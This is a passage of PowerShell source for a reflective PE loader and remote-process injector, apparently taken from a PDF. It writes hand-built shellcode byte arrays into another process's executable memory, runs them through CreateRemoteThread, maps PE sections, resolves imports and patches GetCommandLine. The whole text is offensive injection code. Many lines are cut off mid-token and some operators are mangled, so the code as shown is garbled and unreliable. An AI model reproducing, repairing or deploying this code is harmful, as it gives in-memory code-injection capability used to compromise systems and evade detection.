MemberType NoteProperty Name FileType Value EXE \n}\nelse\n{\nThrow \"PE file is not an EXE or DLL\"\n}\nreturn $PEInfo\n}\nFunction Import-DllInRemoteProcess\n{\nParam(\n[Parameter(Position=0, Mandatory=$true)]\n[IntPtr]\n$RemoteProcHandle,\n[Parameter(Position=1, Mandatory=$true)]\n[IntPtr]\n$ImportDllPathPtr\n)\n$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllP\n$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)\n$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\nif ($RImportDllPathPtr -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process\"\n}\n[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPat\nif ($Success -eq $false)\n{\nThrow \"Unable to write DLL path to remote process memory\"\n}\nif ($DllPathSize -ne $NumBytesWritten)\n{\nThrow \"Didn't write the expected amount of bytes when writing a DLL path to load to th\n}\n$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")\n$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"LoadLibrar\n[IntPtr]$DllAddress = [IntPtr]::Zero\nif ($PEInfo.PE64Bit -eq $true)\n{\n$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\nif ($LoadLibraryARetMem -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process for the return value of LoadLib\n}\n$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4,\n\n```\n\n-----\n\n```\n$LoadLibrarySC2 @(0x48, 0xba)\n$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)\n$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length +\n$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n$SCPSMemOriginal = $SCPSMem\nWrite-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem,\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem,\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)\n$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [U\n[UInt64]$SCLength, $Win32Constants.MEM_COMMIT bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\nif ($RSCAddr -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process for shellcode\"\n}\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCP\n[UInt64]$SCLength, [Ref]$NumBytesWritten)\nif (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n{\nThrow \"Unable to write shellcode to remote process memory.\"\n}\n$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle StartAddress $RSCAddr -Win32Functions $Win32Functions\n$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\nif ($Result -ne 0)\n{\nThrow \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n}\n[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSiz\n$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARet\n[UInt64]$PtrSize, [Ref]$NumBytesWritten)\nif ($Result -eq $false)\n{\nThrow \"Call to ReadProcessMemory failed\"\n}\n[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Return\n[IntPtr])\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr]\n\n```\n\n-----\n\n```\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out Null\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr]\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n}\nelse\n{\n[IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr Win32Functions $Win32Functions\n$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\nif ($Result -ne 0)\n{\nThrow \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n}\n[Int32]$ExitCode = 0\n$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)\nif (($Result -eq 0) -or ($ExitCode -eq 0))\n{\nThrow \"Call to GetExitCodeThread failed\"\n}\n[IntPtr]$DllAddress = [IntPtr]$ExitCode\n}\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr]\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\nreturn $DllAddress\n}\nFunction Get-RemoteProcAddress\n{\nParam(\n[Parameter(Position=0, Mandatory=$true)]\n[IntPtr]\n$RemoteProcHandle,\n[Parameter(Position=1, Mandatory=$true)]\n[IntPtr]\n$RemoteDllHandle,\n[Parameter(Position=2, Mandatory=$true)]\n[String]\n$FunctionName\n)\n$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($Func\n$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)\n$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zer\nbor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\nif ($RFuncNamePtr -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process\"\n}\n[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr,\n[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)\nif ($Success -eq $false)\n{\n\n```\n\n-----\n\n```\nThrow Unable to write DLL path to remote process memory \n}\nif ($FunctionNameSize -ne $NumBytesWritten)\n{\nThrow \"Didn't write the expected amount of bytes when writing a DLL path to load to th\n}\n$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")\n$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, \"GetProcA\n$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntP\n[UInt64]$PtrSize, $Win32Constants.MEM_COMMIT bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)\nif ($GetProcAddressRetMem -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process for the return value of GetProc\n}\n[Byte[]]$GetProcAddressSC = @()\nif ($PEInfo.PE64Bit -eq $true)\n{\n$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe\n$GetProcAddressSC2 = @(0x48, 0xba)\n$GetProcAddressSC3 = @(0x48, 0xb8)\n$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)\n$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)\n}\nelse\n{\n$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)\n$GetProcAddressSC2 = @(0xb9)\n$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)\n$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)\n$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)\n}\n$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3\n$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)\n$SCPSMemOriginal = $SCPSMem\nWrite-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $fal\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\n\n```\n\n-----\n\n```\nWrite BytesToMemory Bytes $GetProcAddressSC4 MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSM\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)\nWrite-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem\n$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)\n$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [U\n[UInt64]$SCLength, $Win32Constants.MEM_COMMIT bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)\nif ($RSCAddr -eq [IntPtr]::Zero)\n{\nThrow \"Unable to allocate memory in the remote process for shellcode\"\n}\n$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCP\n[UInt64]$SCLength, [Ref]$NumBytesWritten)\nif (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))\n{\nThrow \"Unable to write shellcode to remote process memory.\"\n}\n$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle StartAddress $RSCAddr -Win32Functions $Win32Functions\n$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)\nif ($Result -ne 0)\n{\nThrow \"Call to CreateRemoteThread to call GetProcAddress failed.\"\n}\n[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSiz\n$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressR\n[UInt64]$PtrSize, [Ref]$NumBytesWritten)\nif (($Result -eq $false) -or ($NumBytesWritten -eq 0))\n{\nThrow \"Call to ReadProcessMemory failed\"\n}\n[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Retur\n[IntPtr])\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr]\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr]\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\n$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPt\n[UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null\nreturn $ProcAddress\n}\nFunction Copy-Sections\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[Byte[]]\n$PEBytes,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 2, Mandatory = $true)]\n\n```\n\n-----\n\n```\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 3, Mandatory = $true)]\n[System.Object]\n$Win32Types\n)\nfor( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n{\n[IntPtr]$SectionHeaderPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropSer\n$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHead\n[IntPtr]$SectionDestAddr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))\n$SizeOfRawData = $SectionHeader.SizeOfRawData\nif ($SectionHeader.PointerToRawData -eq 0)\n{\n$SizeOfRawData = 0\n}\nif ($SizeOfRawData -gt $SectionHeader.VirtualSize)\n{\n$SizeOfRawData = $SectionHeader.VirtualSize\n}\nif ($SizeOfRawData -gt 0)\n{\nTest-MemoryRangeValid -DebugString \"Copy-Sections::MarshalCopy\" -PEInfo $PEInfo StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null\n[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.Pointer\n}\nif ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)\n{\n$Difference = $SectionHeader.VirtualSize - $SizeOfRawData\n[IntPtr]$StartAddress = [IntPtr](AddSignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))\nTest-MemoryRangeValid -DebugString \"Copy-Sections::Memset\" -PEInfo $PEInfo StartAddress $StartAddress -Size $Difference | Out-Null\n$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null\n}\n}\n}\nFunction Update-MemoryAddresses\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 1, Mandatory = $true)]\n[Int64]\n$OriginalImageBase,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Constants,\n[Parameter(Position = 3, Mandatory = $true)]\n\n```\n\n-----\n\n```\n[System.Object]\n$Win32Types\n)\n[Int64]$BaseDifference = 0\n$AddDifference = $true\n[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$\nif (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `\n-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))\n{\nreturn\n}\nelseif ((CompareVal1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) eq $true)\n{\n$BaseDifference = SubSignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)\n$AddDifference = $false\n}\nelseif ((CompareVal1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) eq $true)\n{\n$BaseDifference = SubSignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)\n}\n[IntPtr]$BaseRelocPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.Optiona\nwhile($true)\n{\n$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseR\nif ($BaseRelocationTable.SizeOfBlock -eq 0)\n{\nbreak\n}\n[IntPtr]$MemAddrBase = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddr\n$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2\nfor($i = 0; $i -lt $NumRelocations; $i++)\n{\n$RelocationInfoPtr = [IntPtr](AddSignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))\n[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Re\n[UInt16])\n[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF\n[UInt16]$RelocType = $RelocationInfo -band 0xF000\nfor ($j = 0; $j -lt 12; $j++)\n{\n$RelocType = [Math]::Floor($RelocType / 2)\n}\nif (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `\n\n```\n\n-----\n\n```\n or ($RelocType eq $Win32Constants.IMAGE_REL_BASED_DIR64))\n{\n[IntPtr]$FinalAddr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))\n[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAdd\n[IntPtr])\nif ($AddDifference -eq $true)\n{\n[IntPtr]$CurrAddr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))\n}\nelse\n{\n[IntPtr]$CurrAddr = [IntPtr](SubSignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))\n}\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false\nNull\n}\nelseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)\n{\nThrow \"Unknown relocation found, relocation value: $RelocType, relocationinfo: $Reloca\n}\n}\n$BaseRelocPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))\n}\n}\nFunction Import-DllImports\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Types,\n[Parameter(Position = 3, Mandatory = $true)]\n[System.Object]\n$Win32Constants,\n[Parameter(Position = 4, Mandatory = $false)]\n[IntPtr]\n$RemoteProcHandle\n)\n$RemoteLoading = $false\nif ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)\n{\n$RemoteLoading = $true\n}\nif ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n{\n\n```\n\n-----\n\n```\n[IntPtr]$ImportDescriptorPtr Add\nSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.Optiona\nwhile ($true)\n{\n$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDe\nif ($ImportDescriptor.Characteristics -eq 0 `\n-and $ImportDescriptor.FirstThunk -eq 0 `\n-and $ImportDescriptor.ForwarderChain -eq 0 `\n-and $ImportDescriptor.Name -eq 0 `\n-and $ImportDescriptor.TimeDateStamp -eq 0)\n{\nbreak\n}\n$ImportDllHandle = [IntPtr]::Zero\n$ImportDllPathPtr = (AddSignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))\n$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllP\nif ($RemoteLoading -eq $true)\n{\n$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle ImportDllPathPtr $ImportDllPathPtr\n}\nelse\n{\n$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)\n}\nif (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))\n{\nthrow \"Error importing DLL, DLLName: $ImportDllPath\"\n}\n[IntPtr]$ThunkRef = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)\n[IntPtr]$OriginalThunkRef = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteri\n[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructur\n[IntPtr])\nwhile ($OriginalThunkRefVal -ne [IntPtr]::Zero)\n{\n$ProcedureName = ''\n[IntPtr]$NewThunkRef = [IntPtr]::Zero\nif([Int64]$OriginalThunkRefVal -lt 0)\n{\n$ProcedureName = [Int64]$OriginalThunkRefVal band 0xffff #This is actually a lookup by ordinal\n}\nelse\n{\n[IntPtr]$StringAddr = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)\n$StringAddr = AddSignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Typ\n\n```\n\n-----\n\n```\n[UInt16]))\n$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr\n}\nif ($RemoteLoading -eq $true)\n{\n[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName\n}\nelse\n{\nif($ProcedureName -is [string])\n{\n  [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $Pr\n}\nelse\n{\n  [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressOrdinal.Invoke($ImportDllHand\n}\n}\nif ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)\n{\nThrow \"New function reference is null, this is almost certainly a bug in this script.\n}\n[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $fal\n$ThunkRef = AddSignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::Size\n[IntPtr]))\n[IntPtr]$OriginalThunkRef = AddSignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marsha\n[IntPtr]))\n[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructur\n[IntPtr])\n}\n$ImportDescriptorPtr = AddSignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::\n}\n}\n}\nFunction Get-VirtualProtectValue\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[UInt32]\n$SectionCharacteristics\n)\n$ProtectionFlag = 0x0\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)\n\n```\n\n-----\n\n```\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n{\n$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE\n}\nelse\n{\n$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ\n}\n}\nelse\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n{\n$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY\n}\nelse\n{\n$ProtectionFlag = $Win32Constants.PAGE_EXECUTE\n}\n}\n}\nelse\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n{\n$ProtectionFlag = $Win32Constants.PAGE_READWRITE\n}\nelse\n{\n$ProtectionFlag = $Win32Constants.PAGE_READONLY\n}\n}\nelse\n{\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n{\n$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY\n}\nelse\n{\n$ProtectionFlag = $Win32Constants.PAGE_NOACCESS\n}\n}\n}\nif (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)\n{\n$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE\n}\nreturn $ProtectionFlag\n}\nFunction Update-MemoryProtectionFlags\n{\n\n```\n\n-----\n\n```\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Constants,\n[Parameter(Position = 3, Mandatory = $true)]\n[System.Object]\n$Win32Types\n)\nfor( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n{\n[IntPtr]$SectionHeaderPtr = [IntPtr](AddSignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropSer\n$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHead\n[IntPtr]$SectionPtr = AddSignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)\n[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics\n[UInt32]$SectionSize = $SectionHeader.VirtualSize\n[UInt32]$OldProtectFlag = 0\nTest-MemoryRangeValid -DebugString \"Update-MemoryProtectionFlags::VirtualProtect\" PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null\n$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFl\nif ($Success -eq $false)\n{\nThrow \"Unable to change memory protection\"\n}\n}\n}\nFunction Update-ExeFunctions\n{\nParam(\n[Parameter(Position = 0, Mandatory = $true)]\n[System.Object]\n$PEInfo,\n[Parameter(Position = 1, Mandatory = $true)]\n[System.Object]\n$Win32Functions,\n[Parameter(Position = 2, Mandatory = $true)]\n[System.Object]\n$Win32Constants,\n[Parameter(Position = 3, Mandatory = $true)]\n[String]\n$ExeArguments,\n[Parameter(Position = 4, Mandatory = $true)]\n[IntPtr]\n$ExeDoneBytePtr\n)\n\n```\n\n-----\n\n```\n$ReturnArray @()\n$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n[UInt32]$OldProtectFlag = 0\n[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"Kernel32.dll\")\nif ($Kernel32Handle -eq [IntPtr]::Zero)\n{\nthrow \"Kernel32 handle null\"\n}\n[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(\"KernelBase.dll\")\nif ($KernelBaseHandle -eq [IntPtr]::Zero)\n{\nthrow \"KernelBase handle null\"\n}\n$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeAr\n$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeA\n[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle\n[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle\nif ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr eq [IntPtr]::Zero)\n{\nthrow \"GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW\n}\n[Byte[]]$Shellcode1 = @()\nif ($PtrSize -eq 8)\n{\n$Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8\n}\n$Shellcode1 += 0xb8\n[Byte[]]$Shellcode2 = @(0xc3)\n$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length\n$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\n$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\n$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UIn\nNull\n$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UIn\nNull\n$ReturnArray +=,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)\n$ReturnArray +=,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)\n[UInt32]$OldProtectFlag = 0\n$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalS\n($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)\nif ($Success = 